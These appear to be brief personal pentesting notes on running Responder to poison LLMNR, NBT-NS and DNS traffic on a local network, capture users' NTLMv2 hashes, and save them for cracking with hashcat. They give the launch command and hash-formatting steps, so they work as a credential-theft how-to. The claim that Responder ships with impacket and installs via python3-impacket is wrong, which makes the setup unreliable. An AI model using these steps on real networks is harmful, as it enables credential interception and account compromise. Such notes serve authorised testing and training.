Responder comes in the impacket toolkit. 
> sudo apt install python3-impacket

Run Responder from in network
> responder -I eth0 -rdw 
> (add v for verbose)

Output lists some stuff initially. 
- Poisoners (it's actually listening on each of these)
	- LLMNR 
	- NBT-NS 
	- DNS
- Servers (it's running each of these server types for MITM intercept & respond)
	- HTTP
	- ...
- ...
- Listening for events (this is current status)

Now...
While Responder is running:
	if a user tries to connect to a server in Responder Servers:
		for poisoner in Responder Poisoners:
			collect NTLMv2 username:hash combos. 
			return hash combos to hashcat. 

Don't forget to copy entire hashes into separate files so you can pass them into hashcat. Format will be username::domain:0blahblahblah. Copy all of it. Trim trailing spaces. Save as separate files.

